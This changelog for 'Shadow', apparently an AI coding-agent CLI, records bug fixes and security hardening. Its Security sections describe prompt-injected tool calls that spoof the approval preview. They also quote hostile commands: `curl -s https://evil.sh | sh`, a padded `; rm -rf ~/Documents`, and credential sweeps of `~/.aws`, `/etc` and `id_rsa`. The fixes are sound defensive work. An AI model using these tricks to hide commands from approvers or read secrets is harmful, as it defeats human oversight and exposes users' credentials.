  flash or leak into the transcript.
- **Reasoning-replay capability detection** (P0-1): whether to replay assistant `reasoning_content`
  is now decided by detection rather than by trusting the model name alone, so a reused or aliased
  model name no longer inherits another model's private reasoning wire state.
- **Configurable permission classifier is now abortable** (P0-1): the short model call used for
  permission decisions honors interruption, so it can no longer hang or outlive a steered turn.
- **Streaming watchdog honest-error framing** (P1A-04): idle-timeout errors now report the ACTUAL
  frame they were armed with, and append an actionable hint when a non-default idle timeout was
  configured (`raise \`idleTimeoutMs\` or $SHADOW_IDLE_MS for a slow local serve`).
- **Public-endpoint empty-mid-stream rescue was not re-POSTing under the mock harness** (P1A-04):
  the production path (real `fetch` aborts the response body read) was correct, but the test's
  hand-built `ReadableStream` was never wired to the request signal, so a `neverClosing` mock body
  left `reader.read()` pending forever after the watchdog fired — the rescue was never reached and
  the assertion hung. An equivalent daemon-side guard now reproduces real fetch's abort contract
  (abort → reject the in-flight read with an AbortError), so the watchdog-driven rescue path is
  exercised deterministically.
- **`Controller is already closed` async-after-test noise** (P1A-04): a `stalled()` mock body's
  delayed `close()` could fire after the watchdog already errored the controller. The mock body now
  settles once, guarding the close.
- **Idle/stall errors are no longer treated as a genuine model overload** (P1A-05): a `> idleTimeoutMs`
  stall reports an error whose message contains "the model may be overloaded or the connection
  stalled" — and the fallback classifier matched the substring `overloaded`, so the loop silently
  swapped onto another configured model and re-sent the ENTIRE conversation there. Stall-class codes
  (`idle_timeout`, `network_error`, `empty_body`, `stream_error`) are now excluded **before** any
  message sniffing: a stall is surfaced as a visible, honest error and ridden out rather than
  triggering a mid-task model change.

### Security

- **Self-hosted/local models no longer silently fall back to an arbitrary other entry** (P1A-05):
  a privacy-first user who keeps a cloud entry configured could hit one `> idleTimeoutMs` stall and
  have the whole conversation history silently shipped to that cloud API — no consent, no notice
  that would matter. A model entry marked `selfHosted`, or pointing at a local base URL, now requires
  an explicit per-entry `fallback` field before any provider switch; neither a global fallback nor
  the any-other-entry path can fire. The only automatic swaps that remain are the ones the user
  deliberately wired up — and every one of them is surfaced as a visible one-line notice naming
  the old → new model.

- **Untrusted project config can no longer disarm the approval gate via `permissionRules`** (F07-01 /
  P1A-01): a cloned repo shipping `shadow.config.json` with `{"permissionRules":[{"tool":"run_shell","action":"allow"}]}`
  previously suppressed the confirmation prompt for every matching tool call at default autonomy —
  and `/permissions add` would persist that grant *back into the untrusted project file* it disarmed.
  `permissionRules` is now a global-only key: it is stripped from untrusted project `shadow.config.json`
  (alongside `baseUrl`, `autonomy`, `mcpServers`, etc.) and `/permissions add` always writes
  `~/.shadow/config.json`, never the workspace file. Defense-in-depth: any `write_file`/`edit_file`
  call whose path resolves to a `shadow.config.json` segment (or to `~/.shadow/config.json`) now
  hard-gates for confirmation at every autonomy level, over every allow rule and fast path — the file
  that decides what needs a gate cannot be rewritten without a live human, exactly like the denylist.
- **Relative hook + statusLine paths can no longer resolve against a hostile workspace** (F07-03 /
  P1A-02): a *global* `~/.shadow` config naming a relative hook (`scripts/lint.sh`) was previously
  resolved against the current workspace root and run via `shell:true` at `session_start` — before any
  LLM call or approval gate — so a cloned repo shipping that same relative path was a zero-interaction
  drive-by RCE. Hook scripts now run only if the path is **absolute**; a relative path is refused
  (never executed, never silently re-pointed) with a stderr warning, and on a deny phase
  (`pre_tool_use`/`user_prompt_submit`) the refusal **fails closed** so a misconfigured guard hook can
  never be silently skipped into allowing. `statusLine` now runs with `cwd` pinned to `~` instead of
  the workspace, removing the same relative-script bait vector; the workspace stays reachable via the
  explicit `$SHADOW_CWD` env var.
- **`grep`/`rg`/`find` on the read-only fast path can no longer sweep out-of-jail paths** (F07-02 /
  P1A-03): the auto-allow for `grep /`/`rg `/`find ` scoped operands only for the 14 viewer commands
  (cat/head/tail/...), so `grep -rI password /etc /root ~/.config`, `rg -il token ~`, and
  `find ~ -name id_rsa` all ran unprompted at default auto-edit and their (possibly secret) output
  entered context → provider next turn. The recursive search commands now demote to the approval gate
  the same way the viewers do: any scan root or start path outside the granted roots makes the segment
  not-read-only (never a hard block). A glob/tilde/var operand already fails closed. In-workspace
  grep/rg/find still auto-run; `./src`, `~`, and value-taking options (`-e`, `--include`, `--glob=…`)
  are parsed correctly so patterns are never mistaken for paths. `git grep` was never on the fast path
  and gates as before.
- **No new egress or permission surface** (P1A-04): the per-endpoint stream knobs and the
  `SHADOW_IDLE_MS` env hatch are read-only at runtime — no new network, no new permission rule.

## [5.5.1] - 2026-08-06

### Added

- Added an opt-in Playwright MCP preset for browser automation. Run
  `shadow mcp enable browser` or `/mcp enable browser` to register the pinned official server with
  a visible, isolated Chrome profile; existing custom Playwright configurations are never replaced.
- Browser MCP output is stored under `~/.shadow/playwright-output` instead of the active project and
  capped at 50 MiB, preventing automation snapshots from dirtying repositories or growing without a
  bound.

### Changed

- CLI help, TUI completion, MCP status guidance, and the user guide now explain the Node/npm
  prerequisite, restart behavior, approval boundary, and profile-isolation limits.

## [5.5.0] - 2026-08-04

### Added

- Added Alibaba Qwen/DashScope onboarding and a Qwen 3.8 compatibility suite. Future open-weight
  model IDs pass through unchanged, retain the self-hosted temperature control, and render either
  `reasoning_content` or the newer `reasoning` stream field.
- On verified DashScope endpoints, Qwen 3.8 Max structured reasoning is preserved separately from
  visible content. Requests use its documented completion-token, effort, and preserved-thinking
  controls without leaking those provider-specific options or history to third-party/self-hosted
  aliases.

### Fixed

- Updated the runtime HTTP dependency to `undici` 8.10.0, clearing the known high-severity
  advisories in the previous lockfile. Source builds now declare the dependency's real Node.js
  minimum of 22.19.
- Clean HTTP-200 completions with no assistant text or tool call now retry twice, then stop as an
  actionable provider error instead of reporting blank success.
- A provider stream that fails after partial output can no longer execute tool calls from the failed
  turn or exit successfully. Partial text is retained as interrupted history and headless runs fail.
- Custom onboarding now records whether a public OpenAI-compatible endpoint is self-hosted, so its
  configured temperature is not silently omitted, and later cloud onboarding clears stale trust.

## [5.0.0] - 2026-08-03

### Added

- Self-hosted OpenAI-compatible models now support a validated top-level `temperature` setting
  (`0`–`2`, default `1.0`). Shadow applies it to local/LAN Chat Completions and Responses requests
  while omitting it from Anthropic and public cloud APIs. Remote self-hosts on public hostnames can
  opt in explicitly with `selfHosted: true` at the top level or on a model preset.

### Changed

- The terminal UI now uses progressive `/help`, executable `/config` completions, clearer safety
  badges, more honest approval-scope labels, accessible picker states, and width-safe rendering for
  narrow terminals. `/provider` and `/status` report the live endpoint and local sampling state.

### Fixed

- The production build now starts from a clean `dist/`, and the release gate rejects stale packaged
  JavaScript while restoring the previous artifact if a diagnostic build fails. Clean mirrors that
  intentionally do not track `dist/` now build and validate it in one pass.
- `npm test` now includes TSX component tests that the old script silently skipped. Lint warnings and
  high-severity transitive development advisories were also cleared.
- The public-mirror gate now detects and scrubs private endpoints even when they are backslash-escaped
  inside source regex literals.

## [4.1.0] - 2026-08-01

### Added — sub-agent visibility and transcript correctness

- Running sub-agents are now visible in the transcript via a Turn-HUD, so you can see and follow
  each sub-task's live state instead of guessing whether work is still happening (events, loop, and
  agentTool plumbing). This closes the "I can't see my sub-agents running" gap against reference
  clients.
- New `test/composer-render.test.tsx` locks in the composer's wrap/lock guards so rendering stays
  column-correct and text entry lines cannot be mis-wrapped.

### Fixed

- Error rows no longer render twice (error duplication path removed from the loop fan-out).
- Composer text entry now wraps by terminal column, not by UTF-16 code unit — long input lines no
  longer truncate or mis-wrap.

## [4.0.1] - 2026-07-29

### Fixed — multimodal requests

- Text returned by tools can no longer impersonate a model's reserved media-control tokens. In
  particular, reading Kimi K3's `config.json` returned `<|kimi_image_placeholder|>` verbatim; when
  real images were also present, the server counted that text as another image placeholder and
  rejected every subsequent turn with `More image placeholders than image prompts`.
- Removed the experimental ComfyUI caption backend. The supported `describe_media` path remains the
  OpenAI-compatible `vision` endpoint, and native multimodal `view_image` input is unchanged.

## [4.0.0] - 2026-07-28

Shadow 4 is the trust-and-continuity release: approval UI now means exactly what it shows, every
model gets its real context policy, compaction resumes current work instead of restarting it, and
the update path authenticates release bytes before replacing the running binary.

### Security — release and subprocess boundaries
- `shadow update` no longer downloads an installer and pipes it into a shell. It authenticates a
  signed manifest with Shadow's pinned offline ECDSA key, verifies the selected binary's SHA-256,
  and atomically replaces the executable. Self-update ignores environment-controlled mirrors and
  does not download the large candidate until the manifest has authenticated.
- Hooks, stdio MCP servers, `run_shell`, and TUI status helpers now share a minimal allowlisted
  subprocess environment. Provider keys and agent credentials are withheld unless an MCP server's
  configuration explicitly opts a variable in.
- Approval request IDs are 128-bit random values, so stale browser decisions cannot collide with a
  new request after a watcher or process restart.
- Remote TUI images are DNS-pinned through the SSRF guard, revalidated across redirects, restricted
  to supported image media types, and capped at 20 MiB.

### Fixed — agent continuity and model context
- Compaction runs before every provider request rather than only after tool rounds. The summarizer
  receives the authoritative retained tail plus live goal, plan, and todo state; verbatim user
  instructions survive repeated compactions, and the replacement objective is explicitly framed
  as in-progress work so the model resumes instead of greeting, replanning, or starting over.
- Context policy is recalculated for each model and fallback. Local servers are queried through
  `/props` and `/v1/models`; presets can declare `contextWindow`, and launcher `ctx` arguments are
  understood. Switching models clears the previous provider's token-count floor instead of making
  every model inherit one apparently random shared limit.
- Automatic fallback activates the complete model entry — provider, endpoint, credentials, local
  server, and context policy — across the TUI, web console, and headless mode. It no longer swaps
  only the model string while accidentally sending it to the old provider.

### Fixed — web and local-server lifecycle
- Closing a web session during lazy initialization disposes the late agent, MCP children,
  background shells, wakeups, and jail instead of attaching them to an already-closed session.
- Slow SSE clients are disconnected so EventSource can reconnect and replay missed terminal frames;
  queue accounting now uses transmitted byte length rather than UTF-16 string length.
- GGUF, MLX, vLLM, Docker, and worker process trees receive TERM, a bounded wait, and KILL
  escalation. Concurrent starts are invalidated during shutdown, preventing immortal port holders.

### Fixed — CLI and TUI races
- CLI parsing accepts `--flag=value` and `--`, rejects unknown options and missing values, and no
  longer silently treats option-looking tokens as values.
- Model switching is generation-guarded and preserves the draft while the new provider initializes;
  `/model test` cannot continue with missing credentials.
- Type-ahead remains routed to the composer for the full duration of an in-flight turn instead of
  depending on a short timing window that could turn normal typing into an approval decision.
- Git-source updates refuse dirty or untracked trees, detached HEADs, and local-only commits before
  performing an update.

The pre-4.0.0 TUI review: 55 adversarially-verified findings, 6 of them treated as ship blockers.
The theme of the blocker list was that **the approval dialog could not be trusted to mean what it
showed** — the dialog is the product's entire safety story.

### Fixed — the approval dialog (ship blockers)
- **Type-ahead keystrokes approved tools the user never saw.** "Keep typing while the agent works"
  is an advertised workflow, and a permission gate can open mid-sentence — every in-flight key was
  routed into the dialog as a DECISION. Typing *"also fix the failing test"* hit `f`
  (approve-for-prefix on `rm -rf` — a session-wide grant) and `a` (raise autonomy); the tool ran and
  the dialog vanished before the user's eyes reached it. A key now only counts as a decision if it
  was pressed AFTER the dialog was on screen; in-flight keys go to the composer where they were
  aimed.
- **The preview could be spoofed.** A model-written `description` was the ENTIRE preview for the two
  highest-privilege tools in the app — `agent` (whose instructions live in `prompt`) and
  `apply_patch` (in `patch`) — plus every MCP tool. "agent: Summarize the README" could approve a
  sub-agent prompt that read and exfiltrated ssh keys. Operative fields now outrank `description`,
  and an unrecognised schema shows its real payload.
- **A padded command hid its own tail.** `git status` + 400 spaces + `; rm -rf ~/Documents` rendered
  as "$ git status", the rest pushed past the right edge. Whitespace runs are collapsed, the preview
  wraps to a bounded number of rows, and anything still hidden is counted on screen.
- **"(a)lways" on a denylist prompt ran the call AND wrapped full→manual.** It used the cycling
  toggle instead of `raiseAutonomy`, which exists precisely to prevent this and which the REPL gate
  already used correctly.
- **"(s)ession" and "(f)prefix" grants expired on the next message.** They were private fields of an
  AgentLoop that the TUI rebuilds per user message, so the two advertised grant keys looked broken —
  and a user who is re-prompted after granting stops reading the dialog.
- **`/config get` printed API keys verbatim** while the command description promised "API keys
  hidden". Shape-matching was not enough: a locally-served key (`lm-studio`, a bare hex string)
  matches no known credential pattern, so redaction is now by key NAME, applied deeply.

### Fixed — the transcript
- **CJK and emoji text was silently destroyed.** The flattener wrapped by UTF-16 code unit while
  every row renders inside `wrap="truncate"`, so the overflow was not wrapped — it was DELETED, with
  no marker and no way to scroll it back. Measured against the pre-fix code: **214 columns of text
  destroyed** across a mixed corpus, worst single row 40 columns. Root cause was three independent
  width implementations; there is now one (`src/tui/width.ts`), shared by the composer, the
  flattener and the overlays.
- Sub-agent output no longer bleeds into the parent transcript. A sub-agent was handed the PARENT's
  event bus, so its answer printed up to three times, its context % overwrote the HUD mid-tool, and
  its per-turn cost corrupted `/cost`. It now gets its own bus that forwards only tool activity,
  failures and its final result. Its total spend is reported once, so session cost stays honest.
- Raw `<tool_call>` XML is no longer committed to the transcript. Recovery only stripped an envelope
  when it successfully parsed a call, so a weak local model naming a tool that does not exist left
  the markup in the answer — on exactly the Qwen/GLM-class models Shadow exists for.
- A suppressed duplicate block now leaves a visible marker. For a single-block answer, "the model
  restarted" and "this paragraph legitimately repeats" are indistinguishable; suppressing silently
  meant the transcript quietly disagreed with what the model said.

### Fixed — terminal state (the 3.6.0 mouse-incident class)
- **Bracketed paste, the window title and the `shadow` theme's background survived any signal or
  crash.** The 3.6.0 fix bound a reset to the signals for mode 1000 ONLY; every other mode reset from
  a React destructor or a promise continuation, neither of which runs when the process dies. A
  `kill`, a closed SSH session or an uncaught exception left the terminal dirty. All four modes now
  share one owner with a restore bound to `exit` and to the fatal signals.
- **Mouse reporting made the process unkillable.** `process.once(sig, …)` overrides Node's default
  disposition, so with `SHADOW_MOUSE=1` a session SURVIVED SIGINT and SIGHUP and orphaned itself —
  holding its provider connection and MCP children — when the terminal window closed. The restore
  handler now re-raises.
- Kitty inline images used `ESC G` where the protocol requires the APC `ESC _ G`, so no image
  rendered and ~100 characters of base64 were shredded into the transcript instead. The test suite
  asserted the wrong bytes, locking the bug in.
- `/clear` and the headless renderer no longer write escapes into pipes and files.

### Fixed — key routing
- **Ctrl-C is dispatched above every focus owner.** It sat below the dialog and picker branches,
  both of which return on every key, so it was dead for the entire life of any modal — on frames
  whose own hint row advertises "Ctrl-C ×2 quits".
- Ctrl+R reverse search works under `/vim` (the vim block claimed Esc first, so the search could not
  be closed and subsequent keys corrupted the composer).
- Shift+Tab reaches the autonomy ring while the slash menu is open; Esc-to-clear is undoable;
  bracketed paste strips control bytes like the typed path; `/table done` can actually end a round
  table.

### Fixed — turn and session integrity
- Two gated calls in one turn no longer orphan an approval promise and hang the turn forever. The
  gate is a FIFO queue, and the parallel-execution check now covers all four paths that can prompt
  (it tested only the autonomy floor, ignoring the denylist, permission rules and the classifier).
- A `schedule_wakeup` firing mid-turn is queued instead of starting a second concurrent turn on the
  shared context, which used to clobber the abort controller and make one turn un-interruptible.
- Esc works during tools that ignore the abort signal (every MCP tool qualifies) — the loop races
  the call against the interrupt. Measured: a 30-second uncooperative tool now unwinds in ~150ms.
- `/resume` and `/rewind` repaint the transcript, so the screen and the model's context no longer
  disagree about what was said. `/resume` also seeds the new session log, so `/export` after a
  resume is no longer frontmatter-only.
- The `/rewind` picker lists SNAPSHOT turns instead of composer submissions. The two units drift
  apart within minutes of normal use, so the menu named one turn and reverted workspace files to a
  different one.
- Manual `/compact` is locked and abortable. It rewrote the shared context while the composer stayed
  live, and `context.maybeSummarize` had always accepted a signal that the TUI never passed.
- The auto-answer countdown cancels when the user engages, instead of merely restarting — a user who
  engaged and then stepped away had an answer submitted over their half-made selections. Its
  transcript line now reports what actually happened.
- A multi-select question with nothing ticked no longer commits an empty answer while the UI is
  visibly highlighting a row.

### Fixed — frame budget
- Two configurations that wiped the user's scrollback on every keystroke: an expanded task list with
  a multi-line draft, and the model picker on terminals of ~19 rows or fewer. The composer's own
  height cap and the task list's budget were computed independently from different assumptions —
  which is why the bug survived. Both now derive from one place, verified by a sweep over rows
  15–40 × every panel combination.

### Fixed — commands
- `/fast on|off` honours its documented argument instead of always toggling; `/effort <garbage>`
  errors instead of silently cycling; `/doctor model` and `/local test` were advertised in the
  argument menus but never implemented — both now run the real capability probe; `/init` on an
  unwritable workspace reports the error instead of taking the TUI down; git commands no longer
  spray raw stderr over the interface.
- Vim `x`/`s`/`dl`/`dh` operate on grapheme clusters, so deleting an emoji no longer sends half a
  surrogate pair to the provider.

### Fixed — local models (field report)
- **A Gemma-4 MLX model was completely unloadable in Shadow while running fine outside it.** Shadow
  chose its MLX server by asking one question — "does config.json have a `vision_config`?" — and
  sent every match to `mlx_vlm.server`. But a vision_config means the model HAS vision, not that
  mlx-vlm can LOAD it: `Gemma4ForConditionalGeneration` is an any-to-any architecture converted
  with, and natively implemented by, mlx-lm (`mlx_lm/models/gemma4.py`). Handed to mlx-vlm it died
  matching `vision_tower.*` weights that layout does not have — `exited (code 3) before it began
  serving` — on a model `mlx_lm.server` serves at ~70 tok/s.
  Server choice now consults the INSTALLED mlx-lm for native support of the architecture (a
  filesystem check, so it stays correct as mlx-lm adds architectures without a Shadow release),
  falls back to the other server automatically if the first one dies before serving, and can be
  pinned per model with `"mlxServer": "lm" | "vlm"`.
- **The error hid its own cause.** A weight-mismatch prints the exception FIRST and then dumps a
  hundred parameter names, so Shadow's "last 12 lines" was a wall of
  `vision_tower.encoder.layers.9.…weight,` and none of the reason. The failing line is now surfaced
  above the tail.
- **The load-timeout message hardcoded "180s"** while the real budget is 300s/900s for MLX and
  600s/1200s for gguf — misreporting by up to 6.7× exactly when someone is debugging a slow load.

### Changed
- `npm test` sets `--test-timeout`, and the release gate now requires it: a hung test previously
  wedged the entire suite with no output instead of failing.
- The release gate checks the test script's INVARIANTS (quoted glob, timeout present) rather than
  exact-matching the whole string, which turned any legitimate flag addition into a false block.

## [3.8.0] - 2026-07-25

Tier 1 and Tier 2 of the improvement plan: provider robustness, live-state tracking, web session
lifecycle, the last composer gaps, and the build guards that were never actually running.

### Fixed — provider
- **A non-SSE 200 produced a clean EMPTY TURN, forever.** A gateway that ignores `stream: true`
  (a misconfigured LiteLLM/vLLM, a corporate proxy, an older Ollama `/v1`) answers with a plain
  JSON completion body. Every line failed the `data:` test and was skipped, so the turn parsed to
  exactly `[usage 0/0/0, done end_turn]` — no text, no tool calls, **no error** — and the loop
  stopped cleanly. Every turn came back blank with no diagnostic anywhere. The body is now
  recovered when it is a valid completion, and reported loudly when it is not.
- **ESC was ignored during a retry backoff.** On `429 + Retry-After: 60` the process slept through
  the interrupt for a full minute *per retry* while the UI showed the turn as running. Measured
  after: 52ms to stop. The retry ladder also grew from ~2.3s to ~24s — long enough to ride out an
  Anthropic 529 burst instead of silently swapping you to a weaker model mid-task.
- **An idle timeout re-fired the identical prompt at a busy local server**, so a machine already
  doing prompt eval over a large context had a second copy queued and did double the work to
  answer once.
- **`doctor model` blamed the model for its own timeout** — every probe against a slow local
  `.gguf` reported "did not emit a valid write_file call".
- **`<think>` in ordinary prose was swallowed.** Asking Shadow to document think tags truncated
  the answer mid-sentence and lost it from history.
- **A corrupt or oversized image was reported as "the model has no vision support"**, hiding the
  real error. Both cases still recover; they now differ only in what they tell you.
- **Onboarding could echo the API key you had just typed** into terminal scrollback, and accepted
  a silent gateway as "✓ connected".

### Fixed — state
- **`/model` did not move the compaction threshold.** Switching a 200k session onto a 32k local
  serve showed a red context bar, never auto-compacted, and 400'd once per turn.
- **`/clear` left plan mode on**, so every write was denied afterwards with no on-screen reason.
- **Compaction ignored ESC**, locking the composer for 30–60s after "interrupted" had printed.
- Token counting is now bounded and interruptible, includes system+tools so it matches the real
  request, and can no longer ratchet the recorded context size *down*.
- Cost is priced against the model actually in use, not the one the session started with.

### Fixed — web console
- **Revoking a project did not revoke access.** The card disappeared and the API returned 200
  while the still-open session kept reading and writing that directory. Removal now closes every
  session rooted in it.
- **There was no way to close a session** — each one permanently held an agent context, its MCP
  child processes and a 2 MB replay ring, with no cap. Added a close control, a DELETE route and
  a ceiling.
- **Interrupt did nothing during initialization** (which can take minutes), and a cancelled queued
  turn left the browser's input disabled until the view was re-mounted.

### Fixed — composer
- **Shift+Enter, advertised since 3.0, never worked.** Most terminals send a bare `\r` for it. The
  configured encodings are now understood, and **`/terminal-setup`** prints the exact mapping for
  your terminal. The hints now advertise Option+Enter, which works everywhere today.
- **CJK and emoji overran the input box** — wrapping counted characters, not terminal columns, so
  rows were twice their measure and the caret drifted.
- Rebinding a key that could never take effect now says so instead of failing silently.

### Added
- **Ctrl+R reverse history search**, with readline's prompt and semantics.
- `/terminal-setup`.

### Changed
- Fuzzy edit matching no longer applies to single-line hunks — it could rewrite a line the model
  never read.

## [3.7.0] - 2026-07-25

Security hardening. Ten Tier-0 defects from the 2026-07-24 review, each landing with a test that
fails against the old code. **If you run Shadow on untrusted repos, take this one.**

### Security
- **Approval prompts showed the model's own words, not the command.** `previewOf` returned the
  model-writable `description` first, so a prompt-injected `run_shell` could render *"List files
  in the current directory"* on a dialog that approves `curl -s https://evil.sh | sh`. The
  transcript row carrying the real command is emitted *after* the decision. A prompt that can be
  made to lie about what it approves is worse than no prompt. The operative argument now outranks
  free text.
- **`npm test` auto-ran at default autonomy** — and `scripts.test` is arbitrary shell from the
  *workspace*, so a cloned repo declaring `"test": "curl -s https://evil.sh | sh"` got
  zero-interaction RCE. Removed from the read-only allowlist along with the yarn/pnpm forms; it
  gates once, then rides the normal session approval.
- **Reads were not scoped to the workspace.** `cat ~/.aws/credentials` ran unprompted and its
  contents entered the context — i.e. went to the provider on the next turn. File reads are now
  scoped to the granted roots (demoted to the gate, not denied), and the OS sandbox additionally
  denies reads of `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gh`, `~/.netrc`, `~/.docker`, `~/.kube`.
- **Write flags classed as read-only.** `sort -o`, `sort --output=`, `tree -o`, `git diff --output`,
  `uniq`'s second positional and `find -fprint*` all auto-ran and wrote arbitrary files. None
  contain `>`, so the redirect guard never saw them.
- **Permission rules matched the whole serialized input.** `allow run_shell /npm test/`
  allowlisted every command *containing* that text — including when planted in the model-written
  `description`. Rules now match one operative field per tool, `allow` patterns are anchored to
  the whole field, and precedence is deny → ask → allow instead of insertion order (a `deny`
  typed after a broad `allow` was dead code). An `allow` rule also no longer suppresses the
  catastrophic-command denylist.
- **Safety posture froze at process start.** Dropping autonomy mid-session left `/` granted in the
  filesystem jail and spawned sub-agents at the *startup* level, contradicting the documented
  "inherits it, never escalates". Lowering autonomy now re-tightens both.
- **`GET /api/state` returned MCP `env`/`headers` in cleartext** — bearer tokens into the DevTools
  network log and the page's JS heap — while the masking helper sat one module away.

### Fixed
- **`/rewind` destroyed the backup it exists to restore.** Five compounding defects: a per-message
  turn counter that restarted at 0 so turns collided in one directory; an unconditional overwrite
  that then destroyed the pristine original; an off-by-one that filed turn N's backups under N+1;
  the model's raw path spelling creating two entries for one file; and restoring *only* the target
  turn, leaving later edits on disk while reporting success. `multi_edit` and `apply_patch` wrote
  no checkpoint at all — `apply_patch`'s deletions were unrecoverable once the call returned.
- **Two paths permanently 400'd a session** with no recovery short of `/clear`: a background
  sub-agent notification appended between a `tool_use` and its `tool_result`, and snapshots taken
  before tools ran (so every `--resume` after a non-clean stop started on an unpaired `tool_use`).
- **`npm test` was one `mkdir` from running a single file** and still exiting 0 — `sh` has no
  globstar, so an unquoted `test/**/*.test.ts` collapses the moment any test lands in a
  subdirectory. Measured: 1 test, exit 0. The release gate now blocks the unquoted form.
- **Namespaced reasoning tags leaked into visible output.** `</mm:think>` (MiniMax-M family)
  matched no pattern and fell through to the text channel — rendering at the head of the answer
  *and* persisting into history, replayed to the model every later turn.
- **The OS image viewer launched when nobody was watching.** A non-TTY was treated as "can't draw
  inline, so open Preview", which threw an error dialog on every piped or headless run that
  touched an image, and left files in `~/.shadow/img-cache`.
- **Workspace paths at a top-level directory were mangled** — `resolveWithin` ate a character when
  the deepest existing ancestor was `/` (`/work/x` → `/ork/x`), then rejected the result.

### Changed
- **Mouse reporting is off, and `/mouse` is gone.** Shipping it on in 3.6.0 was a mistake: it
  routes the wheel to the app, so the terminal stops scrolling its own scrollback. Worse, the mode
  outlives the process — a session killed before cleanup left the *terminal* stuck reporting mouse
  events. The reset is now bound to exit and SIGINT/SIGTERM/SIGHUP. Click-to-caret remains
  available per-run via `SHADOW_MOUSE=1`.
  To unstick a terminal left in reporting mode by 3.6.0:
  `printf '\033[?1000l\033[?1002l\033[?1003l\033[?1006l'`

### Added
- **`shadow` theme — true black.** `/theme shadow` (aliases `black`, `oled`, `focus`) asks the
  terminal itself to set a `#000000` background via OSC 11, restoring your own on exit. It is the
  terminal's background, not a painted one: in the stock renderer Shadow writes into the normal
  screen buffer and doesn't own the screen, so a per-cell background would leave a ragged edge on
  every short line and never fill the margins. `SHADOW_NO_BG=1` opts out (tmux without passthrough).
  Accents are Okabe–Ito, and every tier is measured against true black — body 15.3:1, dim 9.6:1,
  all accents past AA. The `▌` user bar is brightened so it separates from the `⏺` turn bullet by
  luminance as well as hue, which the stock Okabe–Ito pairing does not.
- **Menu panels are themed.** `menuBg` / `menuSelBg` moved out of a hardcoded slate constant and
  into the palette, so a black theme no longer leaves the command menu glowing blue.
- **Argument menus for every command that has arguments.** `/vim`, `/mouse`, `/fast` (on/off,
  with the live setting marked `✓ current`), `/permissions`, `/doctor`, `/login`.
- **Argument menus can now be dynamic.** A completion may be a function of the live session, so
  `/model` and `/local use` list *your* presets, `/resume` lists *your* sessions, and `/rewind`
  lists *your* turns — instead of requiring the value to be typed from memory. Where there's
  nothing to offer yet, the menu shows an explanatory row that can't be selected or run.

## [3.6.0] - 2026-07-24

The composer becomes a real text field, the page finally shares one left edge, and local models
show up in `/model` under a name you can actually read.

### Added
- **Local models get human names.** A HuggingFace cache folder ends in the snapshot's content
  hash, and `local add` took its preset name from the last path segment — so an MLX model landed
  in the `/model` picker as `404364e7467a87a9e31777b71408e96caabd9d5b` and the only way to switch
  to it was to retype that hash at `/local use`. Names now come from the `models--org--name`
  segment. Presets already saved under a hash are re-labelled once, automatically, on next launch
  (the label only — never the model an MLX server hot-loads).
- **Word- and line-wise editing in the composer.** Option+Delete / Ctrl+W delete a word;
  Option+← / → and Ctrl+← / → move by word (all four terminal encodings); Ctrl+A / Ctrl+E and
  the Home / End keys jump to the line ends; Ctrl+K / Ctrl+U kill to the end / start of the line
  into a kill ring that Ctrl+Y yanks back; Ctrl+B / Ctrl+F move by character; Ctrl+Z (or Ctrl+_)
  undoes the last destructive edit. Word boundaries are path-aware: `composer.ts` peels to
  `composer.` then `composer`, the way a native text field does.
- **Click to place the caret**, on by default. `/mouse off` (persisted) or `SHADOW_MOUSE=0`
  returns the wheel, native scrollback and drag-select to the terminal; with it on, use
  Shift+wheel to scroll and Option/Shift+drag to select.
- **An unsent draft survives ↑.** Stepping into history parks it; ↓ past the newest entry
  brings it back, instead of an empty box.

### Fixed
- **Click-to-caret was unreachable dead code.** Every mouse report hit an early return before
  the handler could run, and the handler's own matcher could never fire because Ink strips the
  chunk-leading ESC. Its geometry also assumed a bottom-anchored frame, which is only true once
  the transcript has filled the screen — the caret now anchors off a real cursor-position query.
- **The forward-delete key deleted backwards.** Ink reports `\x1b[3~` as the same `key.delete`
  as Backspace; they are now told apart by raw sequence.
- **Backspace could leave half an emoji in the outgoing message.** Deletion and character motion
  are grapheme-aware, so a lone UTF-16 surrogate can no longer reach the provider.
- **Ctrl+\ , Ctrl+] , Ctrl+^ and Ctrl+_ spliced invisible control bytes into the message.**
  Unprintable input is filtered (tab and newline survive).
- **The composer was misaligned with the rest of the page.** It painted flush-left while the
  transcript was inset four columns, its rules ran the full terminal width, and its text wrapped
  eight columns early. One left edge, one right edge, one wrap width.
- **Four blank rows above the input on every idle screen** — a live-preview reserve nothing ever
  rendered into when idle, plus a blank status spacer. Now one. The composer still never moves
  during a turn.
- **Ctrl+T's expanded task list jumped four columns left** and drew two full-terminal-width rules;
  `/statusline` output sat one column off every other chrome row; the live streaming preview opened
  with a blank that split the paragraph and ate half its slot; `/help` and other system output
  welded onto the end of the previous answer with no separator.

## [3.5.1] - 2026-07-22

Hotfix after 3.5.0 drive: context compaction on big LAN models, Ctrl+T, overflow recovery.

### Fixed
- **Local context budget no longer invents 32k.** Unknown local windows keep the configured
  budget (128k default); clamp only when the model entry/launcher provides a real `ctx`.
  512k / 256k LAN serves were thrashing compact and 400ing mid-turn.
- **Compaction thrash + “restart from first prompt”.** Hysteresis only re-arms under the
  trigger; pin is reframed as an in-progress SESSION OBJECTIVE; force-compact+retry on
  llama.cpp “available context size” overflow.
- **Ctrl+T task list.** Ink delivers Ctrl+T as `\x14` — now maps to `ctrl+t`. Expand works
  mid-turn; empty list gives a clear hint.

## [3.5.0] - 2026-07-22

Claude-style terminal transcript: recon collapses, edits stay visible, quieter markdown.
`main` is the product line again (cut over from the long-running stock-renderer branch).

### Added

- **Claude-style tool collapse.** Consecutive read/grep/glob/view calls stack into one
  calm line (`Read 3 files, Grep 2 patterns · ⌄ ^O`). Writes, shell, network, and agents
  **never** fold — so you always see when the agent is mutating the workspace.
- **Live recon HUD.** Mid-burst the live row progresses as `Reading N files, Grepping M…`
  instead of flashing every single tool name.
- **Human tool names.** Transcript and HUD use `Read` / `Update` / `Write` / `Bash` /
  `Fetch` (not `edit_file` / `run_shell`).
- **Diff teasers.** Long edit bodies keep a 2-line `+`/`−` preview under the header, then
  fold the rest (`⌄ diff N lines · ^O`). Headers carry `+N −M` stats.

### Changed

- **Quiet code fences.** No ╭─/╰─ frames around fenced code — dim language label + `│`
  gutter only (one border in the app = the composer). Live stream preview matches committed.
- **H1 underlines** match title width, not the full terminal.
- **Air before signal tools** so edits/shell don't blend into recon texture.
- **`main` cutover.** Local `main` now tracks the product tip; stale side branches pruned.

### Fixed

- **macOS install path.** After copying to `~/.local/bin/shadow`, re-`codesign` is required
